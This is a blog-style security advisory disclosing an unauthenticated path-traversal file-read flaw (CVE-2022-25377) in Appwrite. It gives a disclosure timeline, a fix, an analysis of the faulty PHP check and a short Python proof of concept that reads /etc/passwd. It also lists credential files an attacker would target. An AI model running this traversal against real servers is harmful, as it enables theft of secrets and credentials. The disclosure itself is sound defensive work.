<!doctype html><html lang=en><head><meta name=viewport content="width=device-width,initial-scale=1"><meta charset=utf-8><meta content="utf-8" http-equiv=encoding><link rel=preload href=/fonts/vollkorn/Vollkorn-VariableFont_wght.ttf as=font type=font/ttf crossorigin><link rel=stylesheet href=/css/bootstrap-grid.min.css type=text/css><link rel=stylesheet href=/css/main.css type=text/css><meta name=apple-mobile-web-app-title content="dubell.io | Unauthenticated LFI in Appwrite 0.5.0 <= 0.12.1"><meta name=apple-mobile-web-app-capable content="yes"><meta name=apple-mobile-web-app-status-bar-style content="black-translucent"><meta name=twitter:site content="@dubs3c"><meta name=twitter:creator content="@dubs3c"><meta property="og:title" content="dubell.io | Unauthenticated LFI in Appwrite 0.5.0 <= 0.12.1"><meta name=twitter:title content="dubell.io | Unauthenticated LFI in Appwrite 0.5.0 <= 0.12.1"><meta itemprop=name content="dubell.io | Unauthenticated LFI in Appwrite 0.5.0 <= 0.12.1"><meta name=application-name content="dubell.io | Unauthenticated LFI in Appwrite 0.5.0 <= 0.12.1"><meta property="og:site_name" content="dubell.io"><meta property="og:article:published_time" content=2022-02-22T13:13:37Z><meta property="article:published_time" content=2022-02-22T13:13:37Z><base href=https://dubell.io/unauthenticated-lfi-in-appwrite-0.5.0-0.12.1/><link rel=canonical href=https://dubell.io/unauthenticated-lfi-in-appwrite-0.5.0-0.12.1/ itemprop=url><meta name=url content="https://dubell.io/unauthenticated-lfi-in-appwrite-0.5.0-0.12.1/"><meta name=twitter:url content="https://dubell.io/unauthenticated-lfi-in-appwrite-0.5.0-0.12.1/"><meta property="og:url" content="https://dubell.io/unauthenticated-lfi-in-appwrite-0.5.0-0.12.1/"><meta property="og:article:author" content="Dubs3c"><meta property="article:author" content="Dubs3c"><meta name=author content="Dubs3c"><meta name=description content="Unauthenticated LFI in Appwrite 0.5.0 <= 0.12.1"><meta itemprop=description content="Unauthenticated LFI in Appwrite 0.5.0 <= 0.12.1"><meta property="og:description" content="Unauthenticated LFI in Appwrite 0.5.0 <= 0.12.1"><meta name=twitter:description content="Unauthenticated LFI in Appwrite 0.5.0 <= 0.12.1"><meta itemprop=image content="https://dubell.io//img/logo2.png"><meta property="og:image" content="https://dubell.io//img/logo2.png"><meta name=twitter:image content="https://dubell.io//img/logo2.png"><meta name=twitter:image:src content="https://dubell.io//img/logo2.png"><meta property="og:updated_time" content=2022-02-22T13:13:37Z><link rel=sitemap type=application/xml title=Sitemap href=https://dubell.io//sitemap.xml><title>dubell.io | Unauthenticated LFI in Appwrite 0.5.0 &lt;= 0.12.1</title></head><body><div class=container-lg><div class=row><div class=col><h1 class=logo-title><a href=/>dubell.io</a></h1><nav><ul><li><a href=/>/etc/motd</a></li><li><a href=/www/>/var/www</a></li><li><a href=/mnt/>/mnt</a></li><li><a href=/usr/>/usr</a></li></ul></nav></div></div><div class=row><div class=col><article><h1>Unauthenticated LFI in Appwrite 0.5.0 &lt;= 0.12.1</h1><p><small><a href=/categories/advisories>Advisories</a> / February 22, 2022 â€¢ 2 min read</small><br><small><strong>Tags:</strong> <a href=/tags/web class=tag>web</a> <a href=/tags/exploit class=tag>exploit</a></small></p><div id=article_content><p>While exploring cyber space I stumbled upon a project called <a href=https://appwrite.io>Appwrite</a>. Looked interesting, started browsing the code. Eventually, I discovered an undisclosed vulnerability in one of the endpoints allowing an attacker to read local files on the system.</p><p>The endpoint <code>/.well-known/acme-challenge</code> is vulnerable against local file inclusion which allows an attacker to read arbitrary files on the system. The endpoint contains incorrect checks for verifying that file is located within a defined base path. Vulnerable versions include version 0.5.0 to 0.11.0. The vulnerability does not require authentication.</p><p>However, in order for a instance of appwrite to be exploitable, the path in <code>APP_STORAGE_CERTIFICATES/.well-known/acme-challenge</code> must exist on disk. This path will be automatically created if the user chooses to install let&rsquo;s encrypt certificates via appwrite.</p><p><strong>Disclosure Timeline:</strong></p><ul><li><strong>2021-12-9:</strong> Sent an email describing the issue, no response</li><li><strong>2021-12-16:</strong> Sent a follow-up email, no response.</li><li><strong>2021-12-21:</strong> Sent a Twitter DM to a project founder, no response</li><li><strong>2022-01-10:</strong> Reported bug to Detectify Crowdsource, they in turn attempted to contact the project owners</li><li><strong>2022-01-24:</strong> Appwrite responds to Detectify, acknowledges the vulnerability</li><li><strong>2022-02-16:</strong> Vulnerability is fixed in version 0.12.2</li><li><strong>2022-02-17:</strong> CVE is requested</li><li><strong>2022-02-20:</strong> CVE-2022-25377 is reserved</li></ul><h2 id=proof-of-concept>Proof of Concept</h2><p>The following poc will extract <code>/etc/passwd</code>:</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span><span style=color:#a90d91>import</span> <span style=color:#000>urllib.request</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span><span style=color:#177500>### Appwrite Unauthenticated LFI</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span><span style=color:#177500># Vulnerable versions: 0.5.0 &lt;= 0.12.1</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span><span style=color:#177500># Date: 2021-12-08</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span><span style=color:#177500># Author: @dubs3c</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span><span style=color:#177500># dubell.io</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span><span style=color:#177500>#</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span><span style=color:#177500># $APP_STORAGE_CERTIFICATES/.well-known/acme-challenge must exist on target&#39;s disk</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span><span style=color:#a90d91>try</span>:
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span>    <span style=color:#000>r</span> <span style=color:#000>=</span> <span style=color:#000>urllib</span><span style=color:#000>.</span><span style=color:#000>request</span><span style=color:#000>.</span><span style=color:#000>urlopen</span>(<span style=color:#c41a16>&#39;http://localhost:8080/.well-known/acme-challenge/../../../../../../../../etc/passwd&#39;</span>)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span>    <span style=color:#a90d91>print</span>(<span style=color:#000>r</span><span style=color:#000>.</span><span style=color:#000>read</span>()<span style=color:#000>.</span><span style=color:#000>decode</span>())
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span><span><span style=color:#a90d91>except</span> <span style=color:#000>urllib</span><span style=color:#000>.</span><span style=color:#000>error</span><span style=color:#000>.</span><span style=color:#000>HTTPError</span> <span style=color:#a90d91>as</span> <span style=color:#000>e</span>:
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15</span><span>    <span style=color:#a90d91>print</span>(<span style=color:#c41a16>f</span><span style=color:#c41a16>&#34;[-] Status code </span><span style=color:#c41a16>{</span><span style=color:#000>e</span><span style=color:#000>.</span><span style=color:#000>status</span><span style=color:#c41a16>}</span><span style=color:#c41a16>. Exploit not possible...&#34;</span>)
</span></span></code></pre></div><h2 id=mitigation>Mitigation</h2><p>Update to version <a href=https://github.com/appwrite/appwrite/releases/tag/0.12.2>0.12.2</a></p><h2 id=technical-description>Technical Description</h2><p>This is possible mainly because the check <code>if (!\substr($absolute, 0, \strlen($base)) === $base)</code> is incorrect. It inverts the result of <code>substr</code>, causing it to become <code>false</code>. The final <code>if</code> statement then becomes <code>if (false === $base) {error}</code> which is not <code>true</code>, thereby bypassing the check. This can be fixed by using <code>!==</code> instead.</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span><span style=color:#000>$base</span> <span style=color:#000>=</span> <span style=color:#000>\realpath</span>(<span style=color:#000>APP_STORAGE_CERTIFICATES</span>);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span><span style=color:#000>$path</span> <span style=color:#000>=</span> <span style=color:#000>\str_replace</span>(<span style=color:#c41a16>&#39;/.well-known/acme-challenge/&#39;</span>, <span style=color:#c41a16>&#39;&#39;</span>, <span style=color:#000>$request</span><span style=color:#000>-&gt;</span><span style=color:#836c28>getURI</span>());
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span><span style=color:#000>$absolute</span> <span style=color:#000>=</span> <span style=color:#000>\realpath</span>(<span style=color:#000>$base</span><span style=color:#000>.</span><span style=color:#c41a16>&#39;/.well-known/acme-challenge/&#39;</span><span style=color:#000>.</span><span style=color:#000>$path</span>);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span><span style=color:#a90d91>if</span> (<span style=color:#000>!</span><span style=color:#000>$base</span>) {
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span>        <span style=color:#a90d91>throw</span> <span style=color:#a90d91>new</span> <span style=color:#000>Exception</span>(<span style=color:#c41a16>&#39;Storage error&#39;</span>, <span style=color:#1c01ce>500</span>);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span>}
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span><span style=color:#a90d91>if</span> (<span style=color:#000>!</span><span style=color:#000>$absolute</span>) {
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span>        <span style=color:#a90d91>throw</span> <span style=color:#a90d91>new</span> <span style=color:#000>Exception</span>(<span style=color:#c41a16>&#39;Unknown path&#39;</span>, <span style=color:#1c01ce>404</span>);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span>}
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span><span style=color:#177500>// this is bypassed because !substr() is inverted before the equivalence check
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span><span><span style=color:#177500></span><span style=color:#a90d91>if</span> (<span style=color:#000>!</span><span style=color:#000>\substr</span>(<span style=color:#000>$absolute</span>, <span style=color:#1c01ce>0</span>, <span style=color:#000>\strlen</span>(<span style=color:#000>$base</span>)) <span style=color:#000>===</span> <span style=color:#000>$base</span>) { 
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15</span><span>        <span style=color:#a90d91>throw</span> <span style=color:#a90d91>new</span> <span style=color:#000>Exception</span>(<span style=color:#c41a16>&#39;Invalid path&#39;</span>, <span style=color:#1c01ce>401</span>);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16</span><span>}
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18</span><span><span style=color:#a90d91>if</span> (<span style=color:#000>!</span><span style=color:#000>\file_exists</span>(<span style=color:#000>$absolute</span>)) {
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19</span><span>        <span style=color:#a90d91>throw</span> <span style=color:#a90d91>new</span> <span style=color:#000>Exception</span>(<span style=color:#c41a16>&#39;Unknown path&#39;</span>, <span style=color:#1c01ce>404</span>);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20</span><span>}
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22</span><span><span style=color:#000>$content</span> <span style=color:#000>=</span> <span style=color:#000>@</span><span style=color:#000>\file_get_contents</span>(<span style=color:#000>$absolute</span>);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24</span><span><span style=color:#a90d91>if</span> (<span style=color:#000>!</span><span style=color:#000>$content</span>) {
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25</span><span>        <span style=color:#a90d91>throw</span> <span style=color:#a90d91>new</span> <span style=color:#000>Exception</span>(<span style=color:#c41a16>&#39;Failed to get contents&#39;</span>, <span style=color:#1c01ce>500</span>);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">26</span><span>}
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">27</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">28</span><span><span style=color:#000>$response</span><span style=color:#000>-&gt;</span><span style=color:#836c28>text</span>(<span style=color:#000>$content</span>);
</span></span></code></pre></div><h2 id=impact>Impact</h2><p>The consequences of this vulnerability is quite severe, as it allows reading local files on the system. If <code>php</code> is running as root as it is in provided docker environment, the LFI allows for reading <em>any</em> file on the system. Interesting files an attacker would try to retrieve (but not limited to):</p><ul><li>/proc/self/environ (contains appwrite secrets such as smtp- and db password)</li><li>/etc/shadow</li><li>/etc/passwd</li><li>Private SSH keys</li><li>Private certificate keys</li><li>.bash-history</li><li>Local appwrite cache files</li><li>Configuration files</li></ul><p>According to Shodan.io (2021-12-08), there are 562 servers running appwwrite. It is recommended to fix this as soon as possible.</p></div></article></div></div><div class=row><footer></footer></div></div><script src=/js/bootstrap.min.js async></script><script src=/js/main.js defer async></script></body></html>